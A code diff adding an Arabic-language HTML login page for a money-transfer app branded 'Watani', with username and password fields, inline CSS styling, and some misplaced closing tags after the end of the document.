@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تطبيق تحويل الأموال</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f5f5;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: rgb(222, 10, 10);
+            box-shadow: 0 2px 5px rgba(228, 15, 15, 0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .logo img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: calc(100% - 40px);
+            padding: 10px;
+            border: 1px solid rgb(209, 14, 14);
+            border-radius: 4px;
+        }
+        .input-group input[type="password"] {
+            width: calc(100% - 60px);
+        }
+        .input-group .icon {
+            position: absolute;
+            margin-left: -35px;
+            margin-top: 10px;
+            font-size: 1.2em;
+        }
+        .input-group .icon-lock {
+            margin-left: -50px;
+        }
+        .button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: hsl(55, 97%, 73%);
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 1em;
+            cursor: pointer;
+        }
+        .link {
+            margin-top: 10px;
+            display: block;
+            color: #007bff;
+            text-decoration: none;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <img src="logo.png" alt="وطني-Watani">
+    </div>
+    <form>
+        <div class="input-group">
+            <label for="username">اسم المستخدم أو رقم الهاتف</label>
+            <input type="text" id="username" name="username" required>
+            <span class="icon">&#128100;</span>
+        </div>
+        <div class="input-group">
+            <label for="password">الرقم السري</label>
+            <input type="password" id="password" name="password" required>
+            <span class="icon icon-lock">&#128274;</span>
+        </div>
+        <button type="submit" class="button">تسجيل الدخول</button>
+    </form>
+    <a href="#" class="link">نسيت الرقم السري؟</a>
+    <a href="#" class="link">مستخدم جديد؟ سجل الآن!</a>
+</div>
+
+</body>
+</html>
+</head>
+<link rel="stylesheet" href="ta.css">
+</head>
+<script src="ni.js"></script>
+</body>
